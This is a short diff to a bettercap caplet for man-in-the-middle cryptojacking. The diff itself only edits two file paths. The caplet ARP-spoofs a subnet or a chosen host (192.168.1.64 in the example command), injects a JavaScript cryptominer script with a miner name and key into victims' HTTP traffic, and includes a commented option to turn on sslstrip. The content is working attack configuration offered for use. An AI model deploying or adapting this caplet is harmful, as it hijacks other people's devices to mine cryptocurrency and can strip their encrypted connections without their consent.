@@ -2,7 +2,7 @@
 #
 # targeting the whole subnet by default, to make it selective:
 #
-#   sudo ./bettercap -caplet caplets/crypto-miner.cap -eval "set arp.spoof.targets 192.168.1.64"
+#   sudo ./bettercap -caplet crypto-miner.cap -eval "set arp.spoof.targets 192.168.1.64"
 
 
 # set the name of the Miner: coinhive, cryptoloot or coinimp
@@ -12,7 +12,7 @@ set cryptominer.name coinhive
 set cryptominer.key 123456789
 
 # inject js miner
-set http.proxy.script caplets/crypto-miner.js
+set http.proxy.script crypto-miner.js
 
 # uncomment if you want sslstrip enabled
 #set http.proxy.sslstrip true
